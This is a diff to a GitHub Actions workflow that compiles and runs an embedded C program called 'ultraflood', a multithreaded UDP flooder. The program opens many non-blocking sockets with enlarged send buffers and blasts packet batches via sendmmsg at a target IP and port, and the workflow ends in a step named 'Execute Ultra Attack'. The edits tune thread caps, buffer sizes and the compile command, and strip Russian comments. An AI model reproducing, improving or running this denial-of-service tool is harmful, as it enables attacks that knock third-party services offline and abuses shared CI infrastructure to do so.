@@ -57,14 +57,6 @@ jobs:
           sudo sysctl -w net.ipv4.conf.all.rp_filter=0
           sudo sysctl -w net.ipv4.conf.default.rp_filter=0
           
-          # Увеличение лимитов процессов
-          ulimit -n 1048576
-          ulimit -u unlimited
-          sudo bash -c 'echo "* soft nofile 1048576" >> /etc/security/limits.conf'
-          sudo bash -c 'echo "* hard nofile 1048576" >> /etc/security/limits.conf'
-          sudo bash -c 'echo "root soft nofile 1048576" >> /etc/security/limits.conf'
-          sudo bash -c 'echo "root hard nofile 1048576" >> /etc/security/limits.conf'
-          
           echo "✅ Ultimate system tuning complete"
 
       - name: Compile Ultra Flooder
@@ -93,7 +85,6 @@ jobs:
           #define MIN_PACKET 64
           
           static volatile int running = 1;
-          static unsigned long long total_sent = 0;
           
           typedef struct {
               char target_ip[16];
@@ -127,24 +118,17 @@ jobs:
               int socks[MAX_SOCKETS];
               int sock_count = 0;
               
-              // Создаём много сокетов для максимальной нагрузки
               for (int i = 0; i < MAX_SOCKETS; i++) {
                   int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                   if (s < 0) continue;
                   
-                  // Гигантский буфер отправки
-                  int buf = 1073741824;
-                  while (buf > 65536) {
-                      if (setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
-                      buf /= 2;
-                  }
-                  
-                  // Разрешаем reuse
+                  int buf = 536870912;
+                  setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
                   int val = 1;
                   setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
                   
                   socks[sock_count++] = s;
-                  if (sock_count >= ta->power / 4) break;
+                  if (sock_count >= (ta->power / 4) + 1) break;
               }
               
               if (sock_count == 0) return NULL;
@@ -155,7 +139,6 @@ jobs:
               target.sin_port = htons(ta->target_port);
               inet_pton(AF_INET, ta->target_ip, &target.sin_addr);
               
-              // Подготавливаем несколько вариантов пакетов
               char packets[16][MAX_PACKET];
               for (int i = 0; i < 16; i++) {
                   fill_payload(packets[i], ta->packet_size, i * 0x33);
@@ -183,20 +166,15 @@ jobs:
                   }
                   
                   int sent = sendmmsg(socks[current_sock], msgs, batch, MSG_DONTWAIT);
-                  if (sent > 0) {
-                      local_sent += sent;
-                  }
+                  if (sent > 0) local_sent += sent;
                   
                   current_sock = (current_sock + 1) % sock_count;
                   counter++;
                   
-                  // Обновляем содержимое пакетов
                   if ((counter & 0xFFF) == 0) {
                       int idx = fast_rand() & 15;
                       fill_payload(packets[idx], ta->packet_size, fast_rand());
                   }
-                  
-                  // Микро-задержка для CPU
                   if ((counter & 0xFFFF) == 0) sched_yield();
               }
               
@@ -214,7 +192,7 @@ jobs:
               for (int i = 0; i < 16; i++) {
                   int s = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                   if (s < 0) continue;
-                  int buf = 536870912;
+                  int buf = 268435456;
                   setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
                   socks[sock_count++] = s;
               }
@@ -269,8 +247,9 @@ jobs:
               int power = atoi(argv[5]);
               int packet_size = atoi(argv[6]);
               
-              if (threads > 5000) threads = 5000;
+              if (threads > 4000) threads = 4000;
               if (power > 100) power = 100;
+              if (power < 1) power = 1;
               if (packet_size > MAX_PACKET) packet_size = MAX_PACKET;
               if (packet_size < MIN_PACKET) packet_size = MIN_PACKET;
               
@@ -283,7 +262,6 @@ jobs:
               printf("========================================\n");
               fflush(stdout);
               
-              // Основные потоки атаки
               int main_threads = threads;
               int scan_threads = threads / 2;
               int total_threads = main_threads + scan_threads;
@@ -312,9 +290,9 @@ jobs:
                   idx++;
               }
               
-              printf("✅ All threads launched\n");
+              printf("✅ All %d threads launched\n", idx);
+              fflush(stdout);
               
-              // Мониторинг
               time_t start = time(NULL);
               int elapsed = 0;
               while (running && elapsed < duration) {
@@ -356,7 +334,7 @@ jobs:
           }
           EOF
           
-          gcc -O3 -march=native -pthread -flto -o ultraflood ultraflood.c
+          gcc -O3 -march=native -pthread -flto -o ultraflood ultraflood.c 2>/dev/null || gcc -O3 -pthread -o ultraflood ultraflood.c
           echo "✅ Ultra flooder compiled"
 
       - name: Execute Ultra Attack
